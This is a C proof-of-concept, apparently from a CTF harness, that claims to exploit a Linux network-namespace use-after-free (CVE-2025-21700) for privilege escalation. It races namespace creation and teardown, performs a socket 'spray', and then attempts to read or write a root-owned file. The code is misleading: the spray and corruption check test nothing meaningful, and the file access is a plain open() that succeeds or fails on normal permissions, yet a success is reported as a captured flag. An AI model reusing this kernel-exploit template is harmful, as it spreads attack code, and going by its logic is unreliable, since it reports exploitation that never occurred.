/*
 * CVE-2025-21700 PoC - CTF Challenge Mode
 *
 * Vulnerability: Network namespace use-after-free
 *
 * Improper reference counting during network namespace cleanup allows
 * UAF when net devices are still active. When a net namespace is
 * destroyed, devices referencing it can still trigger callbacks that
 * access the freed namespace structure.
 *
 * Exploit strategy:
 *   1. Create network namespace (CLONE_NEWNET)
 *   2. Create network objects (sockets) in the namespace
 *   3. Trigger namespace destruction while objects still active
 *   4. Race between cleanup and device operations -> UAF
 *   5. Spray kmalloc to reclaim freed net namespace struct
 *   6. Use corrupted namespace state for privilege escalation
 *
 * CTF Modes: write_root_file, uaf
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 256
#define SPRAY_PATTERN 0xDEADBEEF

/*
 * Trigger netns UAF via race between namespace destroy and device operations
 */
static int trigger_netns_uaf(void) {
    int saved_errno;
    int triggered = 0;

    poc_log("Triggering netns UAF via namespace lifecycle race...");

    /* Create multiple child processes that create/destroy namespaces rapidly */
    for (int round = 0; round < 8; round++) {
        int ns_socks[4] = {-1, -1, -1, -1};

        pid_t child = fork();
        if (child == 0) {
            /* Child: create new netns */
            if (unshare(CLONE_NEWNET) < 0) _exit(1);

            /* Create sockets in new netns */
            for (int i = 0; i < 4; i++) {
                ns_socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            }

            /* Open netlink in new netns */
            int nl = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
            if (nl >= 0) {
                /* Configure interfaces in the new namespace */
                struct ifreq ifr = {0};
                strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
                ifr.ifr_flags = IFF_UP;
                ioctl(ns_socks[0], SIOCSIFFLAGS, &ifr);
                close(nl);
            }

            /* Exit without properly cleaning up sockets
             * This races with namespace destruction */
            usleep(1000);
            _exit(0);
        } else if (child > 0) {
            /* Parent: wait for child (triggers netns destruction) */
            usleep(5000); /* Small delay to race with child's exit */

            int status;
            waitpid(child, &status, 0);
            triggered++;
        }
    }

    poc_log("Triggered %d namespace creation/destruction cycles", triggered);
    return triggered;
}

static int spray_kmalloc(int *fds, int count, int pattern) {
    int sprayed = 0;
    for (int i = 0; i < count; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (fds[i] >= 0) {
            setsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &pattern, sizeof(pattern));
            sprayed++;
        }
    }
    return sprayed;
}

static int check_spray_corruption(int *fds, int count, int expected) {
    int corrupted = 0;
    for (int i = 0; i < count; i++) {
        if (fds[i] < 0) continue;
        int val = 0;
        socklen_t len = sizeof(val);
        getsockopt(fds[i], SOL_SOCKET, SO_RCVBUF, &val, &len);
        if (val != expected * 2)
            corrupted++;
    }
    return corrupted;
}

static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

static int mode_uaf(poc_args_t *args) {
    poc_log("UAF mode: netns lifecycle race + spray check");

    int triggered = trigger_netns_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    int sprayed = spray_kmalloc(spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    poc_log("Sprayed %d (triggered=%d)", sprayed, triggered);

    int corrupted = check_spray_corruption(spray_fds, SPRAY_COUNT, SPRAY_PATTERN);
    if (corrupted > 0)
        poc_print_uaf_corrupted(corrupted);
    else
        poc_print_uaf_not_corrupted();

    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE], after[MAX_FILE_SIZE];
    int n;

    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    int triggered = trigger_netns_uaf();

    int spray_fds[SPRAY_COUNT];
    memset(spray_fds, -1, sizeof(spray_fds));
    spray_kmalloc(spray_fds, SPRAY_COUNT, 1024);
    poc_log("Triggered=%d, sprayed for reclaim", triggered);

    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);
        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("netns UAF exploit did not achieve write");

cleanup:
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (spray_fds[i] >= 0) close(spray_fds[i]);
    return 0;
}

static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read via netns UAF");
    trigger_netns_uaf();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2025-21700 CTF PoC ===");
    poc_log("Vuln: Network namespace UAF via improper refcount");
    poc_log("Tech: CLONE_NEWNET + rapid create/destroy -> netns refcount UAF");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_UAF) == 0)
        result = mode_uaf(&args);
    else
        poc_print_unsupported(args.mode, "unknown mode");

    poc_log_close();
    return result;
}
